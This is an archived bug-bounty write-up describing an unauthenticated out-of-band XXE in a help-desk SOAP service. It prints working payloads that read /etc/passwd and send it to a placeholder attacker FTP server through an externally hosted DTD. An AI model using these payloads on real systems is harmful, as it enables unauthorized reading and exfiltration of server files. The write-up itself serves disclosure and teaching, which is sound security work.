---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-10-24_soap-based-unauthenticated-out-of-band-xml-external-entity-oob-xxe-in-a-help-des.md
original_filename: 2018-10-24_soap-based-unauthenticated-out-of-band-xml-external-entity-oob-xxe-in-a-help-des.md
title: SOAP- Based Unauthenticated Out-of-Band XML External Entity (OOB-XXE) in a
  Help Desk Software
category: documents
detected_topics:
- command-injection
tags:
- imported
- documents
- command-injection
language: en
raw_sha256: 48229ccda1830bc7d10d4bbb2e7e450d5b23f1afcf29cd8a1346b5725778362e
text_sha256: 68ca3c8a48c6ab9060c49f81e993eae693cd653c4b5932b75737daf76e66719d
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# SOAP- Based Unauthenticated Out-of-Band XML External Entity (OOB-XXE) in a Help Desk Software

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-10-24_soap-based-unauthenticated-out-of-band-xml-external-entity-oob-xxe-in-a-help-des.md
- Source Type: markdown
- Detected Topics: command-injection
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `48229ccda1830bc7d10d4bbb2e7e450d5b23f1afcf29cd8a1346b5725778362e`
- Text SHA256: `68ca3c8a48c6ab9060c49f81e993eae693cd653c4b5932b75737daf76e66719d`


## Content

---
title: "SOAP- Based Unauthenticated Out-of-Band XML External Entity (OOB-XXE) in a Help Desk Software"
url: "https://medium.com/@mrnikhilsri/soap-based-unauthenticated-out-of-band-xml-external-entity-oob-xxe-in-a-help-desk-software-c27a6abf182a"
authors: ["Nikhil (niks) (@niksthehacker)"]
bugs: ["XXE"]
publication_date: "2018-10-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5630
scraped_via: "browseros"
---

# SOAP- Based Unauthenticated Out-of-Band XML External Entity (OOB-XXE) in a Help Desk Software

SOAP- Based Unauthenticated Out-of-Band XML External Entity (OOB-XXE) in a Help Desk Software
Nikhil (niks)
Follow
2 min read
·
Oct 24, 2018

230

1

I omitted the application name as it was private program.

While registering for an application, i have got wsdl file such as:

https://victim.com/services/ApiService?wsdl

I have used wsdler burp extension to parse the wsdl file as shown in below image:

Press enter or click to view image in full size

Now, I sent a request to repeater and started fuzzing it for XXE. Firstly, i have started with Classic XXE payloads such as:

<?xml version=”1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM “file:///etc/passwd”>]>
<data>&file;</data>
Press enter or click to view image in full size
for file /etc/passwd
Press enter or click to view image in full size
for file /etc/shadow

As you can see, from above two responses we can confirm the existence of vulnerability, but we can only enumerate file from server.

Get Nikhil (niks)’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

In order to extract the content of file, we need to emulate FTP-server (or if you had used a different one, please comment:)

I setup an xxe.dtd file on my server with following payload:

<!ENTITY % d SYSTEM “file:///etc/passwd”>
<!ENTITY % c “<!ENTITY rrr SYSTEM ‘ftp://x.x.x.x:2121/%d;'>">

Download and run the emulated ftp server from following link(Make sure about Port to listen):

ONsec-Lab/scripts
Utils. Contribute to ONsec-Lab/scripts development by creating an account on GitHub.

github.com

Now, we need to enter the following XXE payload in vulnerable request such as:

<!DOCTYPE a [ <!ENTITY % asd SYSTEM "http://x.x.x.x/xxe.dtd"> %asd; %c;]> <sessionId>&rrr;</sessionId>
Press enter or click to view image in full size
Final XXE payload

As soon as you run the vulnerable request, you will start receiving content of /etc/passwd file on emulated FTP server as shown in below screenshot:

Press enter or click to view image in full size

References:

http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html?m=1
https://gist.github.com/staaldraad/01415b990939494879b4`
